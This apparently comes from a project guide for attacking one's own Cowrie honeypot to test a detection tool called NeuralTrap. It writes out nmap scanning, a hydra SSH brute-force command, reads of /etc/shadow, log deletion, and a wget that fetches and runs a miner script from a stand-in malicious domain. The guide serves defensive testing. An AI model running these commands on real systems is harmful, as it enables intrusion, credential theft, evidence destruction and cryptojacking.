# Simulating a Real External Attack on NeuralTrap

This guide details how to perform a realistic external attack against your Cowrie honeypot. By simulating an attack from a separate machine (like a Kali Linux VM or a remote VPS), you can test NeuralTrap's ability to detect, classify, and block live threats across the network.

## Prerequisites
1. **The Target (Honeypot):**
   - The machine running NeuralTrap and Cowrie.
   - Note its external or LAN IP address (e.g., `192.168.1.100`).
   - Ensure Cowrie is running and listening on its port (default `2222` unless you set up port forwarding to `22`).

2. **The Attacker:**
   - A separate machine (e.g., Kali Linux).
   - Tools needed: `nmap`, `hydra`, `ssh`.

---

## Phase 1: Reconnaissance (Scanning the Target)
Before an attacker breaches a system, they scan for open ports.

From the Attacker machine, run an Nmap scan against the Target IP:
```bash
nmap -p 22,2222 -sV 192.168.1.100
```
*Expected Result:* Nmap should identify port `2222` (or `22`) as running `OpenSSH`. NeuralTrap will log this connection attempt but it may not trigger a high threat score yet since no commands were executed.

---

## Phase 2: Breach (SSH Brute Force)
Attackers use automated tools to guess credentials. Let's use `hydra` to brute-force the SSH service.

1. Create a small password list (`passwords.txt`) on the Attacker machine:
   ```bash
   echo -e "123456\npassword\nroot\nadmin" > passwords.txt
   ```
2. Run Hydra against the honeypot:
   ```bash
   hydra -l root -P passwords.txt ssh://192.168.1.100:2222
   ```
*Expected Result:* Cowrie is designed to accept weak credentials. Hydra will successfully "crack" the password (often accepting any password).

---

## Phase 3: Exploitation (Interactive Session)
Now, manually SSH into the honeypot just like a real attacker would.

```bash
ssh root@192.168.1.100 -p 2222
```
*(Enter any password when prompted)*

Once inside the fake shell, execute a sequence of suspicious commands to trigger NeuralTrap's LLM threat analysis:

```bash
# Reconnaissance
whoami
uname -a
cat /etc/passwd
cat /etc/shadow

# Persistence & Defense Evasion
history -c
rm -rf /var/log/syslog

# Execution (Simulated Malware Download)
wget http://malicious-domain.com/miner.sh -O /tmp/miner.sh
chmod +x /tmp/miner.sh
./tmp/miner.sh
```

---

## Phase 4: Triggering Active Defense (Honeytokens)
To test the absolute highest priority alert in NeuralTrap, interact with a planted Honeytoken.

While still logged into the Cowrie SSH session, try to read the fake AWS credentials file:
```bash
cat /root/.aws/credentials
```

---

## Phase 5: Verification on NeuralTrap Dashboard
After executing the attack and exiting the SSH session (`exit`), switch back to your Target machine and open the NeuralTrap Streamlit Dashboard.

**What you should see:**
1. **Live Threat Monitor:** The LLM should have classified the `rm -rf` and `wget` commands as a **High Risk** or **Critical** threat.
2. **Honeytoken Activity:** The access of `/root/.aws/credentials` will immediately appear in the Honeytoken tab.
3. **Blocked IPs:** NeuralTrap's auto-mitigation should have automatically blocked your Attacker machine's IP address (`192.168.1.X`) because the threat score exceeded the threshold.
4. **Forensic Reports:** A detailed, AI-generated forensic report should be available, explaining exactly what the attacker (you) tried to do.
